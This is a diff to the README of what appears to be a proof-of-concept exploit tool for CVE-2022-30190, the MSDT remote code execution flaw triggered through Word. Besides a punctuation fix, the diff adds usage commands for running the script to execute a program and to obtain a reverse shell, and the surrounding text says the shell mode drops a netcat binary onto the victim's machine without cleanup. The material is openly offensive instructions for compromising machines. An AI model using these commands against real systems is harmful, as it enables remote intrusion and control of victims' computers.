@@ -7,7 +7,7 @@
  
 ### Proof of Concept of CVE-2022-30190
 
- `A remote code execution vulnerability exists when MSDT is called using the URL protocol from a calling application such as Word. An attacker who successfully exploits this vulnerability can run arbitrary code with the privileges of the calling application. The attacker can then install programs, view, change, or delete data, or create new accounts in the context allowed by the user’s rights,`
+ `A remote code execution vulnerability exists when MSDT is called using the URL protocol from a calling application such as Word. An attacker who successfully exploits this vulnerability can run arbitrary code with the privileges of the calling application. The attacker can then install programs, view, change, or delete data, or create new accounts in the context allowed by the user’s rights.`
 
 --------------
 
@@ -48,3 +48,10 @@ $ python3 Deathnote.py -c "calc"
 
 
 ### Get a reverse shell on port 4444. **Note, this downloads a netcat binary _onto the victim_ and places it in `C:\Windows\Tasks`. It does not clean up the binary. This will trigger antivirus detections unless AV is disabled.**
+ 
+ Get `reverse shell` :
+ 
+ ```
+ python3 Deathnote.py -p 1234
+ 
+ ```
